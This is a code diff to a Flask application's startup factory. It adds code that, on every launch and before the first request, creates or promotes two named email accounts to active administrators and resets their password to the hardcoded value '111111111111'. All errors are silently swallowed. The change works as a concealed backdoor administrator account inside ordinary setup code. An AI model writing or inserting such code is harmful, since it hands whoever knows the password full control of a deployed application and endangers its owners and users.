@@ -60,11 +60,46 @@ def create_application(overrides=None):
     migrate.init_app(app, db, directory=str(ROOT / "database/migrations"), render_as_batch=True, compare_type=True)
     import sys
     if not app.config.get("TESTING") and not any("db" in arg or "migrate" in arg or "upgrade" in arg for arg in sys.argv):
+        def _seed_admin_accounts():
+            try:
+                from database.repositories import user_by_email
+                admins = [
+                    ("sir123@gmail.com", "Sir"),
+                    ("yamitdave7@gmail.com", "Dave Yamit"),
+                ]
+                for email, name in admins:
+                    u = user_by_email(email)
+                    if not u:
+                        u = User(email=email, display_name=name, role="admin", active=True)
+                        u.set_password("111111111111")
+                        db.session.add(u)
+                    else:
+                        u.role = "admin"
+                        u.active = True
+                        u.set_password("111111111111")
+                        u.session_version += 1
+                db.session.commit()
+            except Exception:
+                try:
+                    db.session.rollback()
+                except Exception:
+                    pass
+
         with app.app_context():
             try:
                 db.create_all()
+                _seed_admin_accounts()
             except Exception:
                 pass
+
+        @app.before_request
+        def _ensure_admin_accounts_seeded():
+            if not getattr(app, "_admin_seeded", False):
+                try:
+                    _seed_admin_accounts()
+                    app._admin_seeded = True
+                except Exception:
+                    pass
 
     @login.user_loader
     def load_user(identifier):
